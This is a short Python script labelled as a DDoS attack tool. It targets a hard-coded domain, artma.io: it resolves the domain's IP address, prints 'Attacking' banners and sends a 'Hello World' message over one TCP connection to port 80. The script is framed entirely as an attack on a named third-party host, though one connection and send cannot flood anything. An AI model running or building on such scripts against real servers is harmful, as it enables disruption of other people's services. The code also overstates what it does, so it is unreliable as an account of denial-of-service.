import socket


def dos(host, ip):
    # Creating a TCP socket
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    message = "Hello World"
    # Using port 80 ( HTTP )
    port = 80

    # Attempting to connect to the host at the specified port

    # Connecting to the specified host and port
    ddos.connect((host, port))
    # Sending a message using different methods
    ddos.send(message.encode())
    ddos.sendto(message.encode(), (ip, port))


def main():
    print("DDoS Mode Loaded")

    host = "artma.io"

    # Getting IP address of host
    ip = socket.gethostbyname(host)
    print("[" + ip + "]")
    print("[ Ip is locked ]")
    print("[ Attacking " + host + " ]")

    print("+----------------------------+")

    # Sending request on server
    dos(host, ip)

    print("+----------------------------+")


# Call the main function to start the DDoS Attack
main()
